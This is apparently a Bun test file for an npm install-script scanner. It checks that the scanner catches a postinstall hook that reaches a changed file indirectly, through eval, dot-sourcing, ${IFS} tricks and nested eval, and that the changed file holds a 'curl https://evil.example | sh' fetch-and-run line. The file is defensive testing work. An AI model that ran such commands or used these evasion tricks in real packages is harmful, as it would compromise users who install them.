import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const sh = "curl https://evil.example | sh\n";

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const shE = (body: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": "N=ok\n" + body + "./tools/$N.sh\n",
  "tools/ok.sh": "true\n",
  "docs/env": "N=../docs/run\n",
  "docs/run.sh": "true\n",
  "README.md": "a\n",
});

// An eval argument is parsed again as a script. A `$` or backtick in that
// argument clears safe names, including a nested eval.
const cases: [string, string][] = [
  ["T1 sh eval 'true;. file'", "eval 'true;. ./docs/env'\n"],
  ["T2 sh eval \"true&&. file\"", "eval \"true&&. ./docs/env\"\n"],
  ["T3 sh eval '{ .;}' glued", "eval '{ . ./docs/env;}'\n"],
  ["T4 sh eval 'true|. file'", "eval 'true||. ./docs/env'\n"],
  ["T5 sh eval 'true;source f'", "eval 'true;source ./docs/env'\n"],
  ["T6 sh eval with ${IFS}", "eval \".${IFS}./docs/env\"\n"],
  ["T7 sh eval printf-built dot", "eval \"$(printf '%s' .) ./docs/env\"\n"],
  ["T8 sh eval var dot", "D=.; eval \"$D ./docs/env\"\n"],
  ["T9 sh $D file", "D=.; $D ./docs/env\n"],
  ["T10 sh eval nested", "eval \"eval '. ./docs/env'\"\n"],
  ["T11 sh eval 'if :;then . f;fi'", "eval 'if :;then . ./docs/env;fi'\n"],
  ["T12 sh eval of read file", "eval \"$(cat ./docs/env)\"\n"],
];

for (const [name, body] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    const base = shE(body);
    holds(base, "docs/run.sh", sh);
    expect(hard(base, { ...base, "README.md": "b\n" }).join(" ")).toMatch(/README\.md/);
  });
}
